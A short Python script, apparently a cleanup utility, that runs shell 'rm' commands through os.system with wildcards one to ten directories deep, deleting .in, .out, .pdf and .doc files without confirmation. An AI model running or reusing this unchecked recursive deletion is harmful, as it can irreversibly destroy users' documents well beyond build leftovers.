#!/bin/python
import os
first_part = "rm "
last_part = "*.in"
last_part2 = "*.out"
last_part3 = "*.pdf"
last_part4 = "*.doc"
last_part5 = "*.exe"
last_part6 = "a.out"

for i in range(10):
    first_part += "*/"
    full = first_part + last_part
    os.system(full)
    os.system(first_part + last_part2)
    os.system(first_part + last_part3)
    os.system(first_part + last_part4)
